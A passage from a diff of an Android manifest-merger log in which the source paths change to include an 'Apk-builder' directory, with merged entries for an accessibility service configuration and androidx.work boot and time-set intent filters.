+202-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:188:17-92
+202-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:188:25-89
 203            </intent-filter>
 204
 205            <meta-data
-205-->/home/runner/workspace/app/src/main/AndroidManifest.xml:190:13-192:72
+205-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:190:13-192:72
 206                android:name="android.accessibilityservice"
-206-->/home/runner/workspace/app/src/main/AndroidManifest.xml:191:17-60
+206-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:191:17-60
 207                android:resource="@xml/accessibility_service_config" />
-207-->/home/runner/workspace/app/src/main/AndroidManifest.xml:192:17-69
+207-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:192:17-69
 208        </service>
 209
 210        <activity
@@ -530,8 +530,8 @@
 298            <intent-filter>
 298-->[androidx.work:work-runtime:2.9.0] /home/runner/.gradle/caches/transforms-4/6ccb31be4e169062422b6c58efb4838b/transformed/work-runtime-2.9.0/AndroidManifest.xml:116:13-120:29
 299                <action android:name="android.intent.action.BOOT_COMPLETED" />
-299-->/home/runner/workspace/app/src/main/AndroidManifest.xml:173:17-79
-299-->/home/runner/workspace/app/src/main/AndroidManifest.xml:173:25-76
+299-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:173:17-79
+299-->/home/runner/workspace/Apk-builder/app/src/main/AndroidManifest.xml:173:25-76
 300                <action android:name="android.intent.action.TIME_SET" />
 300-->[androidx.work:work-runtime:2.9.0] /home/runner/.gradle/caches/transforms-4/6ccb31be4e169062422b6c58efb4838b/transformed/work-runtime-2.9.0/AndroidManifest.xml:118:17-73
 300-->[androidx.work:work-runtime:2.9.0] /home/runner/.gradle/caches/transforms-4/6ccb31be4e169062422b6c58efb4838b/transformed/work-runtime-2.9.0/AndroidManifest.xml:118:25-70
